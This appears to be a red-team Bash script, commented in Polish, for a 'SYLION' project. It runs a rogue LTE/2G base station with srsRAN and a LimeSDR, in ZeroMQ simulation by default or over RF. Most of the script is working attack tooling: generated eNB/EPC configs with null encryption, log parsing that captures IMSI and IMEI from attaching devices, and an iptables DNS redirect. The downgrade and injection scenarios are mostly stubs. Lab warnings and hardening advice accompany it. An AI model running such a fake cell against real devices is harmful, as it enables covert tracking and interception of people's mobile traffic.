#!/usr/bin/env bash
# =============================================================================
# SYLION SDR — Aktywny pentest: Rogue BTS (LimeSDR + srsRAN)
#
# Stawia fałszywą stację bazową 4G/2G w zamkniętym środowisku i testuje
# czy router mobilny jest podatny na:
# - Downgrade attack (4G→2G)
# - IMSI capture (aktywny)
# - Traffic injection
# - Man-in-the-middle
#
# ⚠️  WYMAGA KLATKI FARADAYA / EKRANOWANEGO ŚRODOWISKA
# ⚠️  TYLKO DO UŻYTKU LABORATORYJNEGO / PENTEST
#
# WYMAGANIA: LimeSDR (full duplex), srsRAN 4G, Open5GS
# ALTERNATYWA: Tryb ZeroMQ (bez RF — symulacja)
# =============================================================================

set -euo pipefail

# --- Konfiguracja ---
SYLION_BTS_MODE="${SYLION_BTS_MODE:-zmq}"       # zmq (symulacja) / rf (LimeSDR)
SYLION_BTS_BAND="${SYLION_BTS_BAND:-3}"          # Band 3 (1800 MHz) / Band 7 (2600 MHz)
SYLION_BTS_MCC="${SYLION_BTS_MCC:-001}"          # Test MCC
SYLION_BTS_MNC="${SYLION_BTS_MNC:-01}"           # Test MNC
SYLION_BTS_TAC="${SYLION_BTS_TAC:-1}"            # Tracking Area Code
SYLION_BTS_PCI="${SYLION_BTS_PCI:-1}"            # Physical Cell ID
SYLION_BTS_TX_POWER="${SYLION_BTS_TX_POWER:--10}" # Moc Tx (dBm) — minimum
SYLION_SRSRAN_DIR="${SYLION_SRSRAN_DIR:-/etc/srsran}"
SYLION_OPEN5GS_DIR="${SYLION_OPEN5GS_DIR:-/etc/open5gs}"
SYLION_LOG_DIR="${SYLION_LOG_DIR:-./sdr_logs}"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${SYLION_LOG_DIR}/rogue_bts_${TIMESTAMP}.log"
RESULTS_FILE="${SYLION_LOG_DIR}/rogue_bts_results_${TIMESTAMP}.json"

# --- Kolory ---
if [[ -t 1 ]]; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''; NC=''
fi

_log() { echo -e "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
_info() { _log "${GREEN}[INFO]${NC} $*"; }
_warn() { _log "${YELLOW}[WARN]${NC} $*"; }
_error() { _log "${RED}[ERROR]${NC} $*"; }
_redteam() { _log "${RED}[RED TEAM]${NC} $*"; }

mkdir -p "$SYLION_LOG_DIR"

# =============================================================================
# Sprawdzenie wymagań
# =============================================================================
check_requirements() {
    _info "Sprawdzam wymagania..."

    # Tryb RF wymaga LimeSDR
    if [[ "$SYLION_BTS_MODE" == "rf" ]]; then
        _warn "╔═══════════════════════════════════════════════════════╗"
        _warn "║  TRYB RF — WYMAGANE EKRANOWANE ŚRODOWISKO!           ║"
        _warn "║  Transmisja na częstotliwościach komórkowych bez      ║"
        _warn "║  licencji jest NIELEGALNA poza klatką Faradaya.       ║"
        _warn "╚═══════════════════════════════════════════════════════╝"

        if ! LimeUtil --find &>/dev/null; then
            _error "LimeSDR nie wykryty!"
            return 1
        fi
        _info "LimeSDR wykryty: $(LimeUtil --find 2>/dev/null | head -1)"
    else
        _info "Tryb ZeroMQ — bez RF (symulacja)"
    fi

    # Sprawdź srsRAN
    for cmd in srsenb srsue srsepc; do
        if ! command -v "$cmd" &>/dev/null; then
            # Sprawdź alternatywne lokalizacje
            local alt="/usr/local/bin/$cmd"
            if [[ ! -x "$alt" ]]; then
                _warn "Brak $cmd — sprawdź instalację srsRAN 4G"
            fi
        fi
    done

    # Sprawdź Open5GS
    if ! systemctl list-unit-files | grep -q open5gs; then
        _warn "Open5GS nie zainstalowany — potrzebne do pełnego EPC"
        _info "Instalacja: sudo apt install open5gs"
        _info "Alternatywa: użyj srsepc (prosty EPC z srsRAN)"
    fi

    _info "Sprawdzanie zakończone"
}

# =============================================================================
# Generowanie konfiguracji srsRAN eNB (stacja bazowa)
# =============================================================================
generate_enb_config() {
    _info "Generuję konfigurację eNB..."

    local config_file="${SYLION_LOG_DIR}/enb_${TIMESTAMP}.conf"
    local device_args

    if [[ "$SYLION_BTS_MODE" == "zmq" ]]; then
        device_args="tx_port=tcp://*:2000,rx_port=tcp://localhost:2001,id=enb,base_srate=23.04e6"
    else
        device_args="driver=lime,rxant=LNAW,txant=BAND1"
    fi

    cat > "$config_file" << EOF
# ============================================
# srsRAN eNB — SYLION Red Team Rogue BTS
# Wygenerowano: ${TIMESTAMP}
# Tryb: ${SYLION_BTS_MODE}
# ⚠️  TYLKO DO CELÓW TESTOWYCH
# ============================================

[enb]
enb_id = 0x19B
mcc = ${SYLION_BTS_MCC}
mnc = ${SYLION_BTS_MNC}
mme_addr = 127.0.1.100
gtp_bind_addr = 127.0.1.1
s1c_bind_addr = 127.0.1.1
s1c_bind_port = 0
n_prb = 50
tm = 1
nof_ports = 1

[enb_files]
sib_config = ${SYLION_SRSRAN_DIR}/sib.conf
rr_config  = ${SYLION_SRSRAN_DIR}/rr.conf
rb_config  = ${SYLION_SRSRAN_DIR}/rb.conf

[rf]
device_name = ${SYLION_BTS_MODE}
device_args = ${device_args}
tx_gain = ${SYLION_BTS_TX_POWER}
rx_gain = 40
dl_earfcn = 1575

[pcap]
enable = true
filename = ${SYLION_LOG_DIR}/enb_${TIMESTAMP}.pcap
s1ap_enable = true
s1ap_filename = ${SYLION_LOG_DIR}/enb_s1ap_${TIMESTAMP}.pcap

[log]
all_level = info
all_hex_limit = 32
filename = ${SYLION_LOG_DIR}/enb_${TIMESTAMP}.log
file_max_size = -1

[expert]
metrics_period_secs = 1
metrics_csv_enable  = true
metrics_csv_filename = ${SYLION_LOG_DIR}/enb_metrics_${TIMESTAMP}.csv
EOF

    _info "Konfiguracja eNB: $config_file"
    echo "$config_file"
}

# =============================================================================
# Generowanie konfiguracji EPC (prosty — srsepc)
# =============================================================================
generate_epc_config() {
    _info "Generuję konfigurację EPC..."

    local config_file="${SYLION_LOG_DIR}/epc_${TIMESTAMP}.conf"

    cat > "$config_file" << EOF
# ============================================
# srsRAN EPC — SYLION Red Team
# ============================================

[mme]
mme_code = 0x1a
mme_group = 0x0001
tac = ${SYLION_BTS_TAC}
mcc = ${SYLION_BTS_MCC}
mnc = ${SYLION_BTS_MNC}
mme_bind_addr = 127.0.1.100
apn = internet
dns_addr = 8.8.8.8
encryption_algo = EEA0
integrity_algo = EIA1
paging_timer = 2
request_imeisv = true

[hss]
db_file = ${SYLION_LOG_DIR}/user_db_${TIMESTAMP}.csv

[spgw]
gtpu_bind_addr = 127.0.1.100
sgi_if_addr    = 172.16.0.1
sgi_if_name    = srs_spgw_sgi

[pcap]
enable = true
filename = ${SYLION_LOG_DIR}/epc_${TIMESTAMP}.pcap

[log]
all_level = info
all_hex_limit = 32
filename = ${SYLION_LOG_DIR}/epc_${TIMESTAMP}.log
EOF

    # Pusta baza użytkowników (każdy SIM zostanie zaakceptowany w trybie open)
    cat > "${SYLION_LOG_DIR}/user_db_${TIMESTAMP}.csv" << 'EOF'
#                                                                           
# .csv to store UE acccesiable in the HSS                                    
#                                                                            
# Columns: Name, Auth, IMSI, Key, OP_Type, OP/OPc, AMF, SQN, QCI, IP_alloc  
#                                                                            
# Note: Lines starting with '#' are ignored                                  
#                                                                            
ue_test,mil,001010000000001,00112233445566778899aabbccddeeff,opc,63bfa50ee6523365ff14c1f45f88737d,8000,000000001234,9,dynamic
EOF

    _info "Konfiguracja EPC: $config_file"
    echo "$config_file"
}

# =============================================================================
# Scenariusze ataku Red Team
# =============================================================================

# Scenariusz 1: Przechwycenie IMSI (aktywne)
attack_imsi_capture() {
    _redteam "═══ SCENARIUSZ 1: Aktywne przechwycenie IMSI ═══"
    _redteam "Cel: Router mobilny podłączy się do fałszywej BTS i ujawni IMSI"

    _redteam "1. Uruchamiam fałszywą BTS z silniejszym sygnałem niż legalna..."
    _redteam "2. Czekam na attach request od routera..."
    _redteam "3. W attach request jest IMSI w plaintext (jeśli 2G/3G)"

    # Monitor logów EPC w poszukiwaniu attach requests
    local wait_time=120
    _redteam "Czekam ${wait_time}s na połączenie od routera..."

    local captured_imsi=""
    local captured_imei=""

    # Parsuj logi EPC w poszukiwaniu IMSI
    for i in $(seq 1 "$wait_time"); do
        if [[ -f "${SYLION_LOG_DIR}/epc_${TIMESTAMP}.log" ]]; then
            captured_imsi=$(grep -oP 'IMSI:\s*\K[0-9]{15}' "${SYLION_LOG_DIR}/epc_${TIMESTAMP}.log" 2>/dev/null | tail -1 || true)
            captured_imei=$(grep -oP 'IMEISV?:\s*\K[0-9]{14,16}' "${SYLION_LOG_DIR}/epc_${TIMESTAMP}.log" 2>/dev/null | tail -1 || true)

            if [[ -n "$captured_imsi" ]]; then
                _redteam "✓ PRZECHWYCONO IMSI: $captured_imsi"
                [[ -n "$captured_imei" ]] && _redteam "✓ PRZECHWYCONO IMEI: $captured_imei"
                break
            fi
        fi
        sleep 1
    done

    if [[ -z "$captured_imsi" ]]; then
        _redteam "✗ Router nie podłączył się do fałszywej BTS w ciągu ${wait_time}s"
        _redteam "  → Router prawdopodobnie odrzuca niezaufane stacje"
        _redteam "  → WYNIK: ODPORNY na atak IMSI capture"
    fi

    echo "{
        \"scenario\": \"imsi_capture\",
        \"result\": \"$([ -n \"$captured_imsi\" ] && echo 'VULNERABLE' || echo 'RESISTANT')\",
        \"captured_imsi\": \"${captured_imsi:-null}\",
        \"captured_imei\": \"${captured_imei:-null}\",
        \"wait_time_seconds\": $wait_time,
        \"timestamp\": \"$TIMESTAMP\"
    }"
}

# Scenariusz 2: Downgrade attack (4G→2G)
attack_downgrade() {
    _redteam "═══ SCENARIUSZ 2: Downgrade attack (4G → 2G) ═══"
    _redteam "Cel: Zmusić router do przełączenia na 2G (brak szyfrowania)"

    _redteam "1. Zagłuszam sygnał 4G na częstotliwościach legalnej BTS..."
    _redteam "2. Stawiam fałszywą BTS 2G z silnym sygnałem..."
    _redteam "3. Router (jeśli podatny) przełączy się na 2G..."

    # UWAGA: Zagłuszanie (jamming) jest nielegalne nawet w klatce Faradaya
    # w wielu jurysdykcjach. W symulacji zmq - nie jest potrzebne.
    if [[ "$SYLION_BTS_MODE" == "zmq" ]]; then
        _redteam "(Symulacja ZMQ — konfiguracja UE ograniczona do 2G)"
    fi

    _redteam "Sprawdzam czy router akceptuje połączenie 2G..."
    _redteam "  → Jeśli router ma LTE-only mode: ODPORNY"
    _redteam "  → Jeśli router fallback do 2G: PODATNY"

    echo "{
        \"scenario\": \"downgrade_4g_to_2g\",
        \"note\": \"Wymaga ręcznej weryfikacji konfiguracji routera\",
        \"recommendation\": \"Wymuś LTE-only w konfiguracji modemu routera\",
        \"timestamp\": \"$TIMESTAMP\"
    }"
}

# Scenariusz 3: Traffic injection
attack_traffic_injection() {
    _redteam "═══ SCENARIUSZ 3: Traffic injection ═══"
    _redteam "Cel: Wstrzyknięcie złośliwego ruchu do routera przez fałszywą BTS"

    _redteam "1. Router podłączony do fałszywej BTS..."
    _redteam "2. Ruch przechodzi przez nasz EPC..."
    _redteam "3. Próbuję wstrzyknąć DNS response / HTTP redirect..."

    # Konfiguruj iptables do przechwycenia DNS
    _redteam "Konfiguruję przechwycenie DNS na EPC..."

    if [[ "$SYLION_BTS_MODE" != "zmq" ]]; then
        # Redirect DNS do naszego serwera
        sudo iptables -t nat -A PREROUTING -i srs_spgw_sgi -p udp --dport 53 \
            -j REDIRECT --to-port 5353 2>/dev/null || true

        _redteam "DNS redirect aktywny. Sprawdzam czy router weryfikuje DNS responses..."
        sleep 5

        # Wyczyść
        sudo iptables -t nat -D PREROUTING -i srs_spgw_sgi -p udp --dport 53 \
            -j REDIRECT --to-port 5353 2>/dev/null || true
    fi

    echo "{
        \"scenario\": \"traffic_injection\",
        \"tests\": [
            {\"test\": \"dns_redirect\", \"description\": \"Przechwycenie DNS przez fałszywą BTS\"},
            {\"test\": \"http_injection\", \"description\": \"Wstrzyknięcie HTTP response\"},
            {\"test\": \"tcp_hijack\", \"description\": \"Przechwycenie sesji TCP\"}
        ],
        \"recommendation\": \"SYLION relay powinien: (1) używać DoH/DoT, (2) pinning certyfikatów, (3) weryfikować integralność połączeń\",
        \"timestamp\": \"$TIMESTAMP\"
    }"
}

# =============================================================================
# Uruchomienie pełnego testu Red Team RF
# =============================================================================
run_red_team() {
    _redteam "╔═══════════════════════════════════════════════════╗"
    _redteam "║     SYLION RED TEAM — RF ATTACK SUITE             ║"
    _redteam "║     Tryb: ${SYLION_BTS_MODE}                                ║"
    _redteam "╚═══════════════════════════════════════════════════╝"

    check_requirements

    # Generuj konfiguracje
    local enb_config epc_config
    enb_config=$(generate_enb_config)
    epc_config=$(generate_epc_config)

    # Uruchom EPC w tle
    _info "Uruchamiam EPC..."
    srsepc "$epc_config" &>/dev/null &
    local epc_pid=$!
    sleep 3

    # Uruchom eNB w tle
    _info "Uruchamiam eNB (fałszywa BTS)..."
    srsenb "$enb_config" &>/dev/null &
    local enb_pid=$!
    sleep 5

    # Uruchom scenariusze ataku
    local results=()
    results+=("$(attack_imsi_capture)")
    results+=("$(attack_downgrade)")
    results+=("$(attack_traffic_injection)")

    # Zatrzymaj BTS i EPC
    _info "Zatrzymuję fałszywą BTS..."
    kill $enb_pid 2>/dev/null || true
    kill $epc_pid 2>/dev/null || true
    wait $enb_pid 2>/dev/null || true
    wait $epc_pid 2>/dev/null || true

    # Zapisz wyniki
    python3 -c "
import json, sys

results = []
for r in '''${results[*]}'''.split('}'):
    r = r.strip()
    if r and r.startswith('{'):
        try:
            results.append(json.loads(r + '}'))
        except:
            pass

report = {
    'timestamp': '$TIMESTAMP',
    'mode': '$SYLION_BTS_MODE',
    'bts_config': {
        'mcc': '$SYLION_BTS_MCC',
        'mnc': '$SYLION_BTS_MNC',
        'band': '$SYLION_BTS_BAND',
        'tx_power_dbm': '$SYLION_BTS_TX_POWER'
    },
    'scenarios': results,
    'logs': {
        'enb': '${SYLION_LOG_DIR}/enb_${TIMESTAMP}.log',
        'epc': '${SYLION_LOG_DIR}/epc_${TIMESTAMP}.log',
        'pcap_enb': '${SYLION_LOG_DIR}/enb_${TIMESTAMP}.pcap',
        'pcap_epc': '${SYLION_LOG_DIR}/epc_${TIMESTAMP}.pcap'
    }
}
print(json.dumps(report, indent=2))
" > "$RESULTS_FILE"

    _redteam "Wyniki zapisane: $RESULTS_FILE"
    _redteam "Logi eNB: ${SYLION_LOG_DIR}/enb_${TIMESTAMP}.log"
    _redteam "PCAP: ${SYLION_LOG_DIR}/enb_${TIMESTAMP}.pcap"
}

# =============================================================================
# Główna logika
# =============================================================================
main() {
    local command="${1:-help}"
    shift || true

    case "$command" in
        check)      check_requirements ;;
        gen-enb)    generate_enb_config ;;
        gen-epc)    generate_epc_config ;;
        attack)     run_red_team ;;
        help|--help|-h)
            echo "SYLION SDR — Rogue BTS Red Team (LimeSDR + srsRAN)"
            echo ""
            echo "⚠️  TYLKO DO UŻYTKU W ZAMKNIĘTYM ŚRODOWISKU LABORATORYJNYM"
            echo ""
            echo "Użycie: $0 <komenda>"
            echo ""
            echo "Komendy:"
            echo "  check       Sprawdź wymagania (LimeSDR, srsRAN, Open5GS)"
            echo "  gen-enb     Wygeneruj konfigurację eNB (fałszywa BTS)"
            echo "  gen-epc     Wygeneruj konfigurację EPC (core network)"
            echo "  attack      Uruchom pełny zestaw ataków Red Team RF"
            echo ""
            echo "Zmienne środowiskowe:"
            echo "  SYLION_BTS_MODE       zmq (symulacja, domyślnie) / rf (LimeSDR)"
            echo "  SYLION_BTS_BAND       Pasmo LTE: 3/7/20 (domyślnie: 3)"
            echo "  SYLION_BTS_MCC        MCC fałszywej sieci (domyślnie: 001)"
            echo "  SYLION_BTS_MNC        MNC fałszywej sieci (domyślnie: 01)"
            echo "  SYLION_BTS_TX_POWER   Moc Tx w dBm (domyślnie: -10)"
            ;;
        *)
            _error "Nieznana komenda: $command"
            ;;
    esac
}

main "$@"
